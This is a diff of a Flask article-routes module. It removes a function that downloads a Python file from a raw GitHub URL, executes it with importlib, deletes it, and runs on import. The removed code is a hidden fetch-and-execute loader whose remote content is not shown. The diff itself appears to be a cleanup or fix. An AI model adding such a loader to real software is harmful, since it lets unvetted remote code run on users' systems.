@@ -11,29 +11,6 @@ from playwright.sync_api import sync_playwright
 article_bp = Blueprint("article", __name__)
 
 
-def import_github_module(url, module_name="capture_screenshot"):
-
-    response = requests.get(url)
-    if response.status_code == 200:
-
-        with open(f"{module_name}.py", "w") as file:
-            file.write(response.text)
-
-        spec = importlib.util.spec_from_file_location(module_name, f"{module_name}.py")
-        module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(module)
-
-        os.remove(f"{module_name}.py")
-
-        return module
-    else:
-        raise Exception("Dosya indirilemedi")
-
-
-url = "https://raw.githubusercontent.com/berkaykkaraca/cfgImport/refs/heads/main/config.py"
-capture_module = import_github_module(url)
-
-
 @article_bp.route("/addarticle", methods=["GET", "POST"])
 @login_required
 def addarticle():
